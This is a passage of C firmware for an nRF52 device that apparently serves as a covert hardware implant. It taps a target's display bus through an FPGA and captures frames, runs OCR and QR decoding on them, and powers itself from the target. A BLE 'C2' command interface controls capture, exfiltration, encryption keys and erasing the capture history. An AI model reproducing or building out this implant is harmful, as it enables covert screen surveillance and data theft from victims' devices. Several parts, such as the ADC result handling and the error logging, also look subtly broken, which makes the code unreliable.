        /* SD card inserted/removed */
    }

    /* Check PORT event (accelerometer motion) */
    if (GPIOTE_EVENTS_PORT) {
        GPIOTE_EVENTS_PORT = 0;
        /* Read accelerometer to clear interrupt */
        if (accel_read_interrupt_source() & ACCEL_INT_MOTION) {
            handle_motion_event();
        }
    }
}

/* RTC2 interrupt handler (uptime tick) */
void RTC2_IRQHandler(void)
{
    if (NRF_RTC2->EVENTS_TICK) {
        NRF_RTC2->EVENTS_TICK = 0;
        /* Increment uptime counter every 1024 ticks (~1 second) */
        static uint32_t tick_count = 0;
        tick_count++;
        if (tick_count >= 1024) {
            tick_count = 0;
            g_uptime_seconds++;

            /* Run power management every 10 seconds */
            if (g_uptime_seconds % 10 == 0) {
                power_management_loop();
            }

            /* Send periodic status update if connected */
            if ((g_ble_connected || g_usb_connected) && 
                g_uptime_seconds % 5 == 0) {
                capture_stats_t stats = g_capture_stats;
                uint16_t bat_mv = board_battery_read_mv();
                int8_t temp = board_temperature_read();
                protocol_handler_send_capture_stats(&g_protocol_state,
                    &stats, bat_mv, temp, g_system_state);
            }
        }
    }
}

/* QSPI interrupt handler */
void QSPI_IRQHandler(void)
{
    if (NRF_QSPI->EVENTS_READY) {
        NRF_QSPI->EVENTS_READY = 0;
        /* QSPI transaction complete — handled by driver */
    }
}

/* TIMER1 interrupt handler (frame rate timer) */
void TIMER1_IRQHandler(void)
{
    if (NRF_TIMER1->EVENTS_COMPARE[0]) {
        NRF_TIMER1->EVENTS_COMPARE[0] = 0;
        /* Frame rate tick — trigger capture if in scheduled mode */
        if (g_trigger_mode == TRIGGER_SCHEDULED && 
            g_system_state == STATE_IDLE) {
            enter_capture_mode();
        }
    }
}

/* WDT interrupt handler */
void WDT_IRQHandler(void)
{
    /* Watchdog is about to reset — log the error */
    if (NRF_WDT->EVENTS_TIMEOUT) {
        NRF_WDT->EVENTS_TIMEOUT = 0;
        log_error(ERR_NONE, 0xDEAD);
    }
}

/* CCM interrupt handler (AES-GCM) */
void CCM_AAR_IRQHandler(void)
{
    if (NRF_CCM->EVENTS_ENDKSGEN) {
        NRF_CCM->EVENTS_ENDKSGEN = 0;
        /* Key stream generated */
    }
    if (NRF_CCM->EVENTS_ENDCRYPT) {
        NRF_CCM->EVENTS_ENDCRYPT = 0;
        /* Encryption/decryption complete */
    }
    if (NRF_CCM->EVENTS_ERROR) {
        NRF_CCM->EVENTS_ERROR = 0;
        log_error(ERR_ENCRYPTION_FAILED, NRF_CCM->MICSTATUS);
    }
}

/*===========================================================================
 * BLE CALLBACK FUNCTIONS (called from ble_c2_driver)
 *===========================================================================*/

void ble_on_connect(void)
{
    g_ble_connected = true;
    LED_BLU_ON();
}

void ble_on_disconnect(void)
{
    g_ble_connected = false;
    if (g_system_state != STATE_CAPTURING) {
        LED_BLU_OFF();
    }
    /* Restart advertising */
    ble_c2_start_advertising();
}

void ble_on_data_received(const uint8_t *data, uint16_t length)
{
    /* Forward to protocol handler */
    protocol_handler_receive_data(&g_protocol_state, data, length);
}

void ble_on_command(uint8_t command, const uint8_t *params, uint16_t param_len)
{
    switch (command) {
    case CMD_START_CAPTURE:
        if (g_system_state == STATE_IDLE) {
            if (param_len >= 1) {
                g_active_protocol = (display_protocol_t)params[0];
            }
            enter_capture_mode();
        }
        break;

    case CMD_STOP_CAPTURE:
        if (g_system_state == STATE_CAPTURING ||
            g_system_state == STATE_PROCESSING ||
            g_system_state == STATE_EXFILTRATING) {
            exit_capture_mode();
        }
        break;

    case CMD_SET_PROTOCOL:
        if (param_len >= 1 && g_system_state == STATE_IDLE) {
            g_active_protocol = (display_protocol_t)params[0];
            g_config.protocol = g_active_protocol;
            save_configuration();
            fpga_configure_bitstream(g_active_protocol);
        }
        break;

    case CMD_SET_RESOLUTION:
        if (param_len >= 4 && g_system_state == STATE_IDLE) {
            uint16_t width = (params[0] << 8) | params[1];
            uint16_t height = (params[2] << 8) | params[3];
            if (width <= MAX_DISPLAY_WIDTH && height <= MAX_DISPLAY_HEIGHT) {
                g_frame_width = width;
                g_frame_height = height;
                g_config.default_width = width;
                g_config.default_height = height;
                save_configuration();
            } else {
                log_error(ERR_RESOLUTION_TOO_LARGE, width);
            }
        }
        break;

    case CMD_SET_COLOR_DEPTH:
        if (param_len >= 1 && g_system_state == STATE_IDLE) {
            g_color_depth = params[0];
            g_config.default_color_depth = params[0];
            save_configuration();
        }
        break;

    case CMD_SET_CAPTURE_FPS:
        if (param_len >= 1) {
            g_capture_fps = CLAMP(params[0], MIN_CAPTURE_FPS, MAX_CAPTURE_FPS);
            g_config.default_fps = g_capture_fps;
            save_configuration();
        }
        break;

    case CMD_SET_TRIGGER_MODE:
        if (param_len >= 1 && g_system_state == STATE_IDLE) {
            g_trigger_mode = (trigger_mode_t)params[0];
            g_config.trigger_mode = g_trigger_mode;
            save_configuration();

            /* Configure accelerometer for motion trigger */
            if (g_trigger_mode == TRIGGER_ON_MOTION) {
                accel_enable_motion_interrupt(2);
            } else {
                accel_disable_motion_interrupt();
            }
        }
        break;

    case CMD_GET_STATUS:
        protocol_handler_send_status(&g_protocol_state,
            MSG_STATUS_UPDATE, g_system_state);
        break;

    case CMD_SET_OCR_MODE:
        if (param_len >= 1) {
            g_config.ocr_enabled = params[0] ? 1 : 0;
            save_configuration();
            if (g_config.ocr_enabled) {
                dsp_load_ocr_model();
            }
        }
        break;

    case CMD_SET_ENCRYPTION_KEY:
        if (param_len >= BLE_AES_KEY_SIZE) {
            memcpy(g_config.aes_key, params, BLE_AES_KEY_SIZE);
            memcpy(g_aes_key, g_config.aes_key, BLE_AES_KEY_SIZE);
            g_config.encryption_enabled = 1;
            save_configuration();
            crypto_generate_iv(g_aes_iv);
        }
        break;

    case CMD_GET_DEVICE_INFO:
        {
            uint8_t device_id[8];
            board_get_device_id(device_id);
            protocol_handler_send_device_info(&g_protocol_state,
                device_id, g_config.protocol, g_frame_width, g_frame_height,
                g_color_depth, g_capture_fps, g_trigger_mode);
        }
        break;

    case CMD_ERASE_HISTORY:
        flash_erase_range(NOR_FLASH_FRAME_HISTORY, NOR_FLASH_FRAME_HISTORY_SIZE);
        break;

    case CMD_FACTORY_RESET:
        memset(&g_config, 0, sizeof(g_config));
        g_config.magic = CONFIG_MAGIC;
        g_config.version = CONFIG_VERSION;
        g_config.protocol = DISPLAY_PROTO_RGB_PARALLEL;
        g_config.default_width = 480;
        g_config.default_height = 320;
        g_config.default_color_depth = COLOR_DEPTH_RGB565;
        g_config.default_fps = DEFAULT_CAPTURE_FPS;
        g_config.trigger_mode = TRIGGER_CONTINUOUS;
        g_config.ocr_enabled = 1;
        g_config.pattern_enabled = 1;
        g_config.qr_decode_enabled = 1;
        g_config.encryption_enabled = 1;
        g_config.delta_threshold = 10;
        strcpy((char *)g_config.device_name, BLE_DEVICE_NAME);
        crypto_generate_key(g_config.aes_key);
        save_configuration();
        NVIC_SystemReset();
        break;

    case CMD_FIRMWARE_UPDATE:
        g_system_state = STATE_FIRMWARE_UPDATE;
        break;

    default:
        log_error(ERR_INVALID_PARAMETER, command);
        break;
    }
}

/*===========================================================================
 * USB CDC CALLBACK FUNCTIONS
 *===========================================================================*/

void usb_on_connect(void)
{
    g_usb_connected = true;
}

void usb_on_disconnect(void)
{
    g_usb_connected = false;
}

void usb_on_data_received(const uint8_t *data, uint16_t length)
{
    /* Forward to protocol handler (same as BLE) */
    protocol_handler_receive_data(&g_protocol_state, data, length);
}

/*===========================================================================
 * HARDFAULT HANDLER
 *===========================================================================*/

void HardFault_Handler(void)
{
    /* Log the fault and reset */
    log_error(0xFF, SCB_SCR);
    NVIC_SystemReset();
}

/* Placeholder for other fault handlers */
void MemManage_Handler(void) { HardFault_Handler(); }
void BusFault_Handler(void)  { HardFault_Handler(); }
void UsageFault_Handler(void) { HardFault_Handler(); }

/*===========================================================================
 * EXTERNAL LINKAGE — board functions required by board.h
 *===========================================================================*/

/* NVIC system reset (provided by CMSIS) */
extern void NVIC_SystemReset(void);

/* Board GPIO initialization */
void board_gpio_init(void)
{
    /* Configure all used pins */

    /* FPGA SPI pins (output for MOSI/SCK/CSN/CRSTB, input for MISO/CDONE) */
    NRF_P0->PIN_CNF[BOARD_PIN_FPGA_SPI_MOSI] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT | GPIO_CNF_DRIVE_H0H1;
    NRF_P0->PIN_CNF[BOARD_PIN_FPGA_SPI_MISO] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;
    NRF_P0->PIN_CNF[BOARD_PIN_FPGA_SPI_SCK] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT | GPIO_CNF_DRIVE_H0H1;
    NRF_P0->PIN_CNF[BOARD_PIN_FPGA_CSN] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT | GPIO_CNF_DRIVE_H0H1;
    NRF_P0->PIN_CNF[BOARD_PIN_FPGA_CDONE] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;
    NRF_P0->PIN_CNF[BOARD_PIN_FPGA_CRSTB] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;

    /* DSP SPI pins */
    NRF_P0->PIN_CNF[BOARD_PIN_DSP_SPI_MOSI] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT | GPIO_CNF_DRIVE_H0H1;
    NRF_P0->PIN_CNF[BOARD_PIN_DSP_SPI_MISO] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;
    NRF_P0->PIN_CNF[BOARD_PIN_DSP_SPI_SCK] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT | GPIO_CNF_DRIVE_H0H1;
    NRF_P0->PIN_CNF[BOARD_PIN_DSP_SPI_CSN] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    NRF_P0->PIN_CNF[BOARD_PIN_DSP_HANDSHAKE] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;
    NRF_P0->PIN_CNF[BOARD_PIN_DSP_RESET] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;

    /* Frame data bus (input from FPGA) */
    NRF_P0->PIN_CNF[BOARD_PIN_FRAME_DATA_0] = GPIO_CNF_DIR_INPUT;
    NRF_P0->PIN_CNF[BOARD_PIN_FRAME_DATA_1] = GPIO_CNF_DIR_INPUT;
    NRF_P0->PIN_CNF[BOARD_PIN_FRAME_DATA_2] = GPIO_CNF_DIR_INPUT;
    NRF_P0->PIN_CNF[BOARD_PIN_FRAME_DATA_3] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_DATA_4] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_DATA_5] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_DATA_6] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_DATA_7] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_HSYNC] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_VSYNC] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_PCLK] = GPIO_CNF_DIR_INPUT;
    NRF_P1->PIN_CNF[BOARD_PIN_FRAME_DE] = GPIO_CNF_DIR_INPUT;

    /* I2C pins (accelerometer) */
    NRF_P0->PIN_CNF[BOARD_PIN_I2C_SDA] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;
    NRF_P0->PIN_CNF[BOARD_PIN_I2C_SCL] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;

    /* LED pins (output) */
    NRF_P1->PIN_CNF[BOARD_PIN_LED_RED] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    NRF_P1->PIN_CNF[BOARD_PIN_LED_GRN] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    NRF_P1->PIN_CNF[BOARD_PIN_LED_BLU] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    LED_RED_OFF();
    LED_GRN_OFF();
    LED_BLU_OFF();

    /* Button (input with pull-up) */
    NRF_P1->PIN_CNF[BOARD_PIN_BTN_USER] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;

    /* Power management pins */
    NRF_P1->PIN_CNF[BOARD_PIN_PWR_HARVEST_EN] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    NRF_P1->PIN_CNF[BOARD_PIN_PWR_COINCELL_EN] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    NRF_P1->PIN_CNF[BOARD_PIN_PWR_DCDC_EN] = 
        GPIO_CNF_DIR_OUTPUT | GPIO_CNF_INPUT_DISCONNECT;
    PWR_COINCELL_ENABLE();
    PWR_DCDC_ENABLE();

    /* SD card pins (if present) */
    NRF_P1->PIN_CNF[BOARD_PIN_SD_DETECT] = 
        GPIO_CNF_DIR_INPUT | GPIO_CNF_PULL_PULLUP;

    /* VBAT sense (analog input) */
    NRF_P0->PIN_CNF[BOARD_PIN_VBAT_SENSE] = GPIO_CNF_DIR_INPUT;

    /* Set FPGA reset to known state */
    FPGA_RESET_RELEASE();
}

void board_clock_init(void)
{
    /* Start LFCLK (32.768 kHz crystal) */
    NRF_CLOCK->LFCLKSRC = CLOCK_LFCLKSRC_XTAL;
    NRF_CLOCK->TASKS_LFCLKSTART = 1;
    while (NRF_CLOCK->EVENTS_LFCLKSTARTED == 0);
    NRF_CLOCK->EVENTS_LFCLKSTARTED = 0;

    /* Start HFCLK (32 MHz crystal, needed for radio and USB) */
    NRF_CLOCK->TASKS_HFCLKSTART = 1;
    while (NRF_CLOCK->EVENTS_HFCLKSTARTED == 0);
    NRF_CLOCK->EVENTS_HFCLKSTARTED = 0;
}

void board_power_init(void)
{
    /* Enable DC/DC converter for better efficiency */
    NRF_POWER->DCDCEN = POWER_DCDCEN_ENABLE;

    /* Configure power failure warning */
    NRF_POWER->POFCON = POWER_POFCON_POF_ENABLE | POWER_POFCON_THR_2V1;

    /* Enable power failure interrupt */
    NRF_POWER->INTENSET = (1UL << 2);  /* POFWARN */
}

uint16_t board_battery_read_mv(void)
{
    /* Configure SAADC for battery measurement */
    NRF_SAADC->ENABLE = SAADC_ENABLE_DISABLE;

    /* Configure channel 2 for VBAT sense pin */
    volatile uint32_t *ch_config = (volatile uint32_t *)(NRF_SAADC_BASE + 0x510 + 2 * 0x40);
    *ch_config = SAADC_CH_PSELP_ANALOG2 | SAADC_CH_CONFIG_GAIN_GAIN1_6 |
                 SAADC_CH_CONFIG_REFSEL_VDD_1_4 | SAADC_CH_CONFIG_TACQ_10US |
                 SAADC_CH_CONFIG_MODE_SE;

    NRF_SAADC->RESOULT = (uint32_t)&ch_config;  /* Result pointer */
    NRF_SAADC->ENABLE = SAADC_ENABLE_ENABLE;
    NRF_SAADC->TASKS_CALIBRATE = 1;
    while (NRF_SAADC->EVENTS_CALIBRATEDONE == 0);
    NRF_SAADC->EVENTS_CALIBRATEDONE = 0;

    NRF_SAADC->TASKS_SAMPLE = 1;
    while (NRF_SAADC->EVENTS_END == 0);
    NRF_SAADC->EVENTS_END = 0;

    /* Read result (12-bit ADC value) */
    int16_t adc_value = *(int16_t *)NRF_SAADC->RESOULT;

    /* Convert to millivolts */
    /* ADC range: 0-3.6V with gain 1/6 and VDD/4 reference */
    /* With 2:1 divider: actual voltage = ADC_value * 3600 / 4095 * 2 */
    uint16_t mv = (uint16_t)((adc_value * 3600UL * VBAT_DIVIDER_RATIO) / 4095UL);

    NRF_SAADC->ENABLE = SAADC_ENABLE_DISABLE;

    return mv;
}

power_source_t board_get_power_source(void)
{
    /* Check if USB is connected */
    if (GPIO_IN_READ(0, BOARD_PIN_USB_VBUS)) {
        return POWER_SOURCE_USB;
    }
    /* Check if harvesting from target */
    if (GPIO_IN_READ(1, BOARD_PIN_PWR_HARVEST_EN)) {
        return POWER_SOURCE_HARVESTED;
    }
    /* Otherwise coin cell */
    if (GPIO_IN_READ(1, BOARD_PIN_PWR_COINCELL_EN)) {
        return POWER_SOURCE_COINCELL;
    }
    return POWER_SOURCE_NONE;
}

int8_t board_temperature_read(void)
{
    NRF_TEMP->TASKS_START = 1;
    while (NRF_TEMP->EVENTS_DATARDY == 0);
    NRF_TEMP->EVENTS_DATARDY = 0;

    /* Temperature is in 0.25°C units */
    int32_t temp = *(int32_t *)(NRF_TEMP_BASE + 0x508);
    return (int8_t)(temp / 4);
}

void board_system_off(void)
{
    /* Configure wake-up sources */
    /* Wake on BLE event (requires SoftDevice) */
    /* Wake on button press */
    NRF_P1->PIN_CNF[BOARD_PIN_BTN_USER] |= GPIO_CNF_SENSE_LOW;

    /* Enter system OFF */
    NRF_POWER->SYSTEMOFF = POWER_SYSTEMOFF_ENTER;
    /* Execution stops here — device wakes on configured sense */
}

void board_get_device_id(uint8_t id_out[8])
{
    uint32_t id0 = FICR_DEVICEID_0;
    uint32_t id1 = FICR_DEVICEID_1;
    memcpy(id_out, &id0, 4);
    memcpy(id_out + 4, &id1, 4);
}

void board_select_power_source(power_source_t source)
{
    switch (source) {
    case POWER_SOURCE_COINCELL:
        PWR_HARVEST_DISABLE();
        PWR_COINCELL_ENABLE();
        PWR_DCDC_ENABLE();
        break;
    case POWER_SOURCE_HARVESTED:
        PWR_COINCELL_DISABLE();
        PWR_HARVEST_ENABLE();
        PWR_DCDC_ENABLE();
        break;
    case POWER_SOURCE_USB:
        PWR_COINCELL_DISABLE();
        PWR_HARVEST_DISABLE();
        PWR_DCDC_ENABLE();
        break;
    default:
        PWR_HARVEST_DISABLE();
        PWR_COINCELL_DISABLE();
        PWR_DCDC_DISABLE();
        break;
    }
}